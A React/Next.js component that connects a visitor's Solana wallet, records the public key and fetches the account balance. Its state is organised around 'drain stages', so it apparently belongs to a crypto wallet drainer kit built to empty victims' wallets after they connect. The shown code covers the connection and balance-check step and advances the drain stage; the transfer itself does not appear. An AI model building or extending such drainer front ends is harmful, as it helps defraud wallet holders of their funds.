'use client'
import React, { useMemo } from 'react'
import Image from 'next/image'
import { awaitLoading } from '@/app/services/hook/LoadingState';
import { changeLoadingState } from '@/app/services/redux/getLoadingState';
import { executeCloseWallet } from '@/app/services/redux/closeModel';
import { toast } from 'react-toastify';
import { changeDrainStage } from '@/app/services/redux/drainStages';
import { connectionLevel } from '@/app/constants/conneectionStages';
import { executeConnectionObject } from '@/app/services/redux/walletConnectionObject';
import { getBalance } from '@/app/services/hook/getWalletBalance';

declare global {
  interface Window {
    solana?: any; 
  }
}


declare global{
  interface Event {
    detail:{
      error:any
    }
 }
}

function WalletOptions({src , walletName}:{src:string , walletName:string}) {
const loadingState = changeLoadingState((state)=>state.resetLoadingState)
const closeWallet = executeCloseWallet((state)=>state.resetCloseWallet)
const getDrainStage = changeDrainStage((state)=>state.connectionStage);
const setDrainStage = changeDrainStage((state)=>state.resetConnectionStage)
const isConnected = executeConnectionObject((state)=>state.isConnected) 
const connectionInstance = executeConnectionObject((state)=>state.connectionInstance)
const usersPublicKey = executeConnectionObject((state)=>state.usersPublicKey)
const accountBalance = executeConnectionObject((state)=>state.accountBalance)
const resetConnectionInstance = executeConnectionObject((state)=>state.resetConnectionInstance)
const resetConnectionPublicKey = executeConnectionObject((state)=>state.resetConnectionPublicKey)
const resetAccountBalance = executeConnectionObject((state)=>state.resetAccountBalance)
const setIsConnected = executeConnectionObject((state)=>state.disconnectWallet)

const  createWalletConnection = async(walletName:string) =>{
if(getDrainStage == connectionLevel[0]){
   const selectedWallet = {
    name:walletName,
    connector: window.solana
   }



       try{
        if (typeof window.solana  !== 'undefined') {
          closeWallet(false)
          loadingState(true)
          const connectionResponse = await selectedWallet.connector.connect();
          if(connectionResponse){
            loadingState(false)
            toast.success("Success: connection was successful !!!")
            setDrainStage(connectionLevel[1])
            closeWallet(false)
            setIsConnected(true);
            resetConnectionInstance(connectionResponse)
            const usersExtractedPublicKey = connectionResponse.publicKey.toBase58();
            resetConnectionPublicKey(usersExtractedPublicKey)
            const balance  = await getBalance(usersExtractedPublicKey)
            resetAccountBalance(Number(balance));
            console.log('account balance ',balance)
          }else{
            toast.error("Error: Connection was rejected !!!")
          }
        }else{
            toast.info("Info: No Solana wallet available !!!")
        }
       }catch(error){

       }

      }
  }


  return (
    <div onClick={()=>createWalletConnection(walletName)}  id="select_wallet" className="cursor-pointer  flex w-full items-center h-12 bg-gray-800 rounded-xl">
    <div  className="w-8 h-7 m-2 rounded-md">
      <Image width={40} height={40} alt='' style={{borderRadius: 5}} src={src} />
    </div>
    <div className="text-md font-semibold text-white">
      {walletName}
    </div>
  </div>
  )
}
export default WalletOptions
